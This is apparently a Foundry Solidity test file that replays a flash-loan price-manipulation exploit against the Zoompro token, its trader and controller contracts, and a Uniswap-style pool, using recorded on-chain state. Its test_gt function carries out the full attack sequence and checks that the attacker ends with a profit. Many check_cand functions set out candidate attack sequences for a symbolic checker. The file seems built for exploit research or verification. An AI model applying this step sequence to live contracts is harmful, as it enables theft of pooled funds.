// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./FUSDT.sol";
import "./Zoom.sol";
import "./ZoomController.sol";
import "./ZoomTrader.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract ZoomproTest is Test, BlockLoader {
    USDT usdt;
    Zoom zoom;
    FUSDT fusdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    ZoomController controller;
    ZoomTrader trader;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address zoomAddr;
    address fusdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address controllerAddr;
    address traderAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1662348485;
    uint112 reserve0pair = 15198754777163623656927698;
    uint112 reserve1pair = 2620645036763942583008253456483;
    uint32 blockTimestampLastpair = 1662348362;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair =
        195671538664465213078061739430914573726916960;
    uint256 price1CumulativeLastpair = 4327081577460269226890878866920266;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 0;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtcontroller = 0;
    uint256 balanceOfusdttrader = 84987473365001802519581;
    uint256 totalSupplyzoom = 6666666666666000000000000000000;
    uint256 balanceOfzoompair = 2620645036763942583008253456483;
    uint256 balanceOfzoomattacker = 1;
    uint256 balanceOfzoomcontroller = 1;
    uint256 balanceOfzoomtrader = 1;
    uint256 totalSupplyfusdt = 4979997922172658408539526181;
    uint256 balanceOffusdtpair = 15198754777163623656927698;
    uint256 balanceOffusdtattacker = 1;
    uint256 balanceOffusdtcontroller = 1000000000000000000000000;
    uint256 balanceOffusdttrader = 10015014526634998197480419;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        zoom = new Zoom();
        zoomAddr = address(zoom);
        fusdt = new FUSDT();
        fusdtAddr = address(fusdt);
        pair = new UniswapV2Pair(
            address(fusdt),
            address(zoom),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        controller = new ZoomController(address(pair));
        controllerAddr = address(controller);
        trader = new ZoomTrader(
            address(pair),
            payable(address(router)),
            address(zoom),
            address(usdt),
            address(fusdt)
        );
        traderAddr = address(trader);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        zoom.transfer(address(trader), 500000000000e18);
        fusdt.transfer(address(trader), 1000000e18);
        usdt.transfer(address(trader), 2000000e18);
        // Initialize balances and mock flashloan.
        zoom.transfer(address(pair), balanceOfzoompair);
        fusdt.transfer(address(pair), balanceOffusdtpair);
        zoom.transfer(address(controller), balanceOfzoomcontroller);
        fusdt.transfer(address(controller), balanceOffusdtcontroller);
        usdt.transfer(address(trader), balanceOfusdttrader);
        zoom.transfer(address(trader), balanceOfzoomtrader);
        fusdt.transfer(address(trader), balanceOffusdttrader);
        usdt.approve(attacker, UINT256_MAX);
        zoom.transfer(address(attackContract), balanceOfzoomattacker);
        zoom.approve(attacker, UINT256_MAX);
        fusdt.transfer(address(attackContract), balanceOffusdtattacker);
        fusdt.approve(attacker, UINT256_MAX);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(usdt),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(usdt),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Zoom Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(zoom),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(zoom),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(zoom),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Fusdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(fusdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(fusdt),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(fusdt),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(pair),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(pair),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Controller Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(controller),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(controller),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(controller),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Trader Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(trader),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(trader),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(trader),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(attackContract),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(attackContract),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_zoom(uint256 amount) internal {
        zoom.transferFrom(owner, attacker, amount);
    }

    function payback_zoom(uint256 amount) internal {
        zoom.transfer(owner, amount);
    }

    function borrow_fusdt(uint256 amount) internal {
        fusdt.transferFrom(owner, attacker, amount);
    }

    function payback_fusdt(uint256 amount) internal {
        fusdt.transfer(owner, amount);
    }

    function swap_pair_fusdt_zoom(uint256 amount) internal {
        fusdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(fusdt);
        path[1] = address(zoom);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_zoom_fusdt(uint256 amount) internal {
        zoom.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(zoom);
        path[1] = address(fusdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function breaklr_pair_controller() internal {
        address[] memory n1 = new address[](1);
        n1[0] = address(pair);
        uint256[] memory n2 = new uint256[](1);
        n2[0] = fusdt.balanceOf(address(controller));
        controller.batchToken(n1, n2, address(fusdt));
    }

    function swap_trader_usdt_zoom(uint256 amount) internal {
        usdt.approve(address(trader), type(uint256).max);
        trader.buy(amount);
    }

    function swap_trader_zoom_usdt(uint256 amount) internal {
        zoom.approve(address(trader), type(uint256).max);
        trader.sell(amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt(3000000e18);
        printBalance("After step0 ");
        swap_trader_usdt_zoom(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        breaklr_pair_controller();
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_trader_zoom_usdt(zoom.balanceOf(attacker));
        printBalance("After step4 ");
        payback_usdt((3000000e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_trader_usdt_zoom(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_trader_zoom_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_trader_usdt_zoom(amt1);
        breaklr_pair_controller();
        swap_trader_zoom_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_pair_zoom_fusdt(amt1);
        breaklr_pair_controller();
        swap_pair_fusdt_zoom(amt2);
        payback_zoom(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_trader_zoom_usdt(amt1);
        breaklr_pair_controller();
        swap_trader_usdt_zoom(amt2);
        payback_zoom(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_fusdt(amt0);
        swap_pair_fusdt_zoom(amt1);
        breaklr_pair_controller();
        swap_pair_zoom_fusdt(amt2);
        payback_fusdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_trader_usdt_zoom(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_trader_zoom_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_trader_usdt_zoom(amt1);
        breaklr_pair_controller();
        swap_trader_zoom_usdt(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_pair_zoom_fusdt(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_pair_fusdt_zoom(amt2);
        payback_zoom(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_pair_zoom_fusdt(amt1);
        breaklr_pair_controller();
        swap_pair_fusdt_zoom(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_zoom(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_trader_zoom_usdt(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_trader_usdt_zoom(amt2);
        payback_zoom(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_trader_zoom_usdt(amt1);
        breaklr_pair_controller();
        swap_trader_usdt_zoom(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_zoom(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_fusdt(amt0);
        swap_pair_fusdt_zoom(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_pair_zoom_fusdt(amt2);
        payback_fusdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_fusdt(amt0);
        swap_pair_fusdt_zoom(amt1);
        breaklr_pair_controller();
        swap_pair_zoom_fusdt(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_fusdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_trader_usdt_zoom(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_trader_zoom_usdt(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_pair_zoom_fusdt(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_pair_fusdt_zoom(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_zoom(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_zoom(amt0);
        swap_trader_zoom_usdt(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_trader_usdt_zoom(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_zoom(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_fusdt(amt0);
        swap_pair_fusdt_zoom(amt1);
        breaklr_pair_controller();
        sync_pair();
        swap_pair_zoom_fusdt(amt2);
        swap_trader_zoom_usdt(amt3);
        payback_fusdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
